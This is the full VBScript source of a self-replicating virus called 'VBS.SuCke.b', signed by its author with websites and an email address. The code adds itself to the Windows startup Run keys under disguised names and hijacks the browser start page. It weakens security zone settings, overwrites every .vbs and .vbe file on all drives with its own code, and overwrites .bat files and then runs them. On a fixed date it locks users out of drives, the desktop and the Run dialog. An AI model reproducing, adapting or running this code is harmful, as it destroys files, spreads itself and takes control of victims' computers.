'VBS.SuCke.b by sevenC / N0:7 
'http://sevenc.vze.com/
'http://trax.to/sevenC
'sevenC_zone@yahoo.com
'Just to be learned..
'FuCke of mY oWn LiVe

On Error Resume Next
Dim sucke, Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set sucke = wscript.CreateObject("WScript.Shell")
Set Fso = CreateObject("scripting.FileSystemObject")
Set Drives=fso.drives
Set dropper = Fso.opentextfile(wscript.scriptfullname, 1)
src = dropper.readall
set Trange = document.body.CreateTextRange
sucke.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32", "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
sucke.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "sevenc.vze.com"
sucke.RegWrite "HKLM\Software\Microsoft\Internet Explorer\Main\Start Page", "sectors.vze.com"
sucke.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
sucke.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "sevenC"
sucke.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Shell32", "C:\Windows\Shell32.vbs"
Fso.copyfile wscript.scriptfullname, "C:\Program Files\Internet Explorer\PLUGINS\Command32.exe.vbs"
Fso.copyfile wscript.scriptfullname, "C:\windows\Shell32.vbs"

If month(now) = 9 and day(now) = 19 then
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled", 1, "REG_DWORD"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop", 1, "REG_DWORD"
sucke.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
end if

Set Fso = createobject("scripting.filesystemobject") 
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive & "\"
end If 
Next 
  
Function Dosearch(Path) 
on error resume next
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files
If fso.GetExtensionName(file.path)="vbs" or fso.GetExtensionName(file.path)="vbe" then 
on error resume next
		Set dropper = Fso.createtextfile(file.path, True)
		dropper.write src
		dropper.Close
end if
        If fso.GetExtensionName(file.path)="bat" then
on error resume next
a = "@Echo 123>clock$"
set wh=fso.createtextfile(file.path,true)
wh.write a
wh.close
sucke.run file.path
end if
next
Set Subfolders = folder.SubFolders 
For Each Subfolder in Subfolders 
Dosearch Subfolder.path 
Next 
end function 

'vbs.sucke.b.vbs by sevenC / N0:7